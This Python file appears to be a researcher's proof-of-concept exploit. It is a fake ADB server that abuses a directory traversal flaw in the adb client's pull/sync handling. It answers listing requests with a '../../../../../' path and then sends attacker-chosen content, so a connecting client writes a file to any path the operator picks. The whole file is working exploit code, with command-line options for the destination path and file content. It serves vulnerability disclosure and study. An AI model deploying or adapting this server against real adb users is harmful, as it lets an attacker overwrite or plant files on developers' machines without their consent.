#!/usr/bin/env python3

# This is a dummy, syncronous ADB server written in pure Python by Imre Rad.
# The tool demonstrates a directory traversal vulnerability in the adb implementation.

import os
import sys
import socketserver
import argparse
import unittest
import struct
from collections import namedtuple

LISTEN_PORT = 5555
DESTINATION_PATH = "/etc/proof"
CONTENT = "hello world"

CMD_CNXN = "CNXN"
CMD_OPEN = "OPEN"
CMD_WRTE = "WRTE"
CMD_CLSE = "CLSE"
CMD_OKAY = "OKAY"

Channel = namedtuple("Channel", ["local", "remote", "handler"])

trace_mode = os.getenv("TRACE")
debug_mode = os.getenv("DEBUG")

def calc_adb_checksum(payload : bytes):
    sum = 0
    for b in payload:
        sum = (sum + b) & 0xffffffff
    return sum

class Tests(unittest.TestCase):
    def test_checksum(self):
        ls = bytes("a" * 10000000, "utf-8")
        c = calc_adb_checksum(ls)
        self.assertEqual(c, 0x39d10680)

def eprint(*args, **kwargs):
    print(*args, **kwargs, file=sys.stderr)
def tprint(*args, **kwargs):
    if not trace_mode:
        return       
    eprint(*args, **kwargs)
def dprint(*args, **kwargs):
    if not debug_mode:
        return       
    eprint(*args, **kwargs)

def myrecv(socket):
    r = socket.recv(1024)
    tprint("raw recv:", r)
    return r

def mysend(socket, payload):
    tprint("raw send:", payload)
    return socket.sendall(payload)
    
        
class AdbHandler(socketserver.BaseRequestHandler):
    # this is a map from local to remote channel ids
    last_channel_id = 0
    channels = {}

    def _recv(self):
        return myrecv(self.request)
    def _send(self, payload):
        return mysend(self.request, payload)
        
    def adbsend(self, cmd : str, arg0, arg1, payload = b""):
        cmd_bytes = cmd.encode("utf-8")
        cmd_int = struct.unpack("I", cmd_bytes)[0]
        magic_int = cmd_int ^ 0xffffffff
        magic_bytes = struct.pack("I", magic_int)
        checksum_int = calc_adb_checksum(payload)
        checksum_bytes = struct.pack("I", checksum_int)
        arg0_bytes = struct.pack("I", arg0)
        arg1_bytes = struct.pack("I", arg1)
        length_bytes = struct.pack("I", len(payload))
        dprint("send", "cmd:", cmd, "arg0:", arg0, "arg1:", arg1, "payload length:", len(payload), "payload:", payload)
        
        full = cmd_bytes + arg0_bytes + arg1_bytes + length_bytes + checksum_bytes + magic_bytes + payload
        return self._send(full)

    def handle(self):
        r = b""
        while True:
            a = self._recv()
            if not a:
                return # EOF
            r += a
            if len(r) < 24:
                raise ValueError("Unexpectedly short message")

            while len(r) > 0:
                command_str = r[0:4].decode("utf-8")
                arg0 = struct.unpack("I", r[4:8])[0]
                arg1 = struct.unpack("I", r[8:12])[0]
                plen =  struct.unpack("I", r[12:16])[0]
                if len(r) < 24+plen:
                    break # need to read more
                payload = r[24:24+plen]
                r = r[24+plen:]

                dprint("recv", "cmd:", command_str, "arg0:", arg0, "arg1:", arg1, "payload length:", len(payload), "payload:", payload)

                handler_str = "h_"+command_str
                if not hasattr(self, handler_str):
                    raise ValueError("Unsupported message: "+command_str)
                
                getattr(self, handler_str)(arg0, arg1, payload)
        # reading the initial banner of the client (CNXN ...)
        
        
    def h_CNXN(self, arg0, arg1, payload):
        # 00 00 00 01  00 00 04 00
        return self.adbsend(CMD_CNXN, 0x01000000, 0x00040000, b"device::ro.product.name=sdk_phone_x86;ro.product.model=Android SDK built for x86;ro.product.device=generic_x86;\x00")

    def h_OPEN(self, arg0, arg1, payload):
        payload_str = payload.decode("utf-8").rstrip('\x00')
        if payload_str != "sync:":
            raise ValueError("Unsupported service request "+payload_str.encode("utf-8").hex())
        # the pull cmd is opening a sync service
        self.last_channel_id += 1
        remote_channel_id = arg0
        local_channel_id = self.last_channel_id
        self.channels[remote_channel_id] =  Channel(local_channel_id, remote_channel_id, self.service_sync)
        self.adbsend(CMD_OKAY, self.last_channel_id, arg0)

    def h_WRTE(self, arg0, arg1, payload):
        ch = self.channels.get(arg0)
        if not ch:
            raise ValueError("Client attempted to write to a channel that does not exist", arg0, arg1)
        # we always acknowledge with an OKAY packet, then comes with the service level response
        return self.adbsend(CMD_OKAY, ch.local, ch.remote) or \
               ch.handler(arg0, arg1, payload)
        
    def h_OKAY(self, arg0, arg1, payload):
        # we just swallow
        pass

    def h_CLSE(self, arg0, arg1, payload):
        tprint("CLSE", arg0, arg1, self.channels)
        self.channels.pop(arg1, None)
        
    def service_sync(self, local_channel_id, remote_channel_id, payload):
        command_str = payload[0:4].decode("utf-8")
        rest = payload[4:]
        handler_str = "s_sync_"+command_str
        if not hasattr(self, handler_str):
            raise ValueError("Unsupported sync service message: "+command_str)
        getattr(self, handler_str)(local_channel_id, remote_channel_id, rest)

    def s_sync_LIST(self, local_channel_id, remote_channel_id, payload):
        # adb is asking whether the thing is is about to pull is a directory or a file. We always report a directory no matter what it wants.
        filename = "../../../../../" + self.server.args.destination_path
        filename_bytes = filename.encode("utf-8")
        length_bytes = struct.pack("I", len(filename_bytes))
        
        list_rogue = b"DENT" + bytes.fromhex("b6 81 00 00 04  00 00 00 36 8d c9 61") + length_bytes + filename_bytes
        list_done = b"DONE\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        return self.adbsend(CMD_WRTE, remote_channel_id, local_channel_id, list_rogue + list_done)

    def s_sync_STAT(self, local_channel_id, remote_channel_id, payload):
        self.adbsend(CMD_WRTE, remote_channel_id, local_channel_id, bytes.fromhex("53 54 41 54 ff 41 00 00 00 10 00 00 36 8d c9 61"))

    def s_sync_RECV(self, local_channel_id, remote_channel_id, payload):
        requested_filename = payload[4:].decode("utf-8")
        if not ".." in requested_filename:
            raise ValueError("Attack failed; the client is requesting a file we did not expect")
        print("Attack worked, client is requesting the file with .. in the name!") # goes to stdout to distinguish this from protocol level noise
        content_length = len(self.server.args.content)
        content_length_bytes = struct.pack("I", content_length)
        content_bytes = self.server.args.content.encode("utf-8")
        return self.adbsend(CMD_WRTE, remote_channel_id, local_channel_id, b"DATA" + content_length_bytes) or \
               self.adbsend(CMD_WRTE, remote_channel_id, local_channel_id, content_bytes + b"DONE\x00\x00\x00\x00")
    
    def s_sync_QUIT(self, local_channel_id, remote_channel_id, payload):
        return self.adbsend(CMD_CLSE, remote_channel_id, local_channel_id)

if __name__ == "__main__":
    if os.getenv("TEST"):
        unittest.main()
        sys.exit(0)

    parser = argparse.ArgumentParser()
    parser.add_argument("-lp", "--listen-port", type=int, default=LISTEN_PORT, help="The listening port")
    parser.add_argument("-dp", "--destination-path", default=DESTINATION_PATH, help="The path to drop the payload on the adb client")
    parser.add_argument("-c", "--content", default=CONTENT, help="The content to send to --destination-path")
    args = parser.parse_args()

    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", args.listen_port), AdbHandler) as t:
        t.args = args
        t.serve_forever()
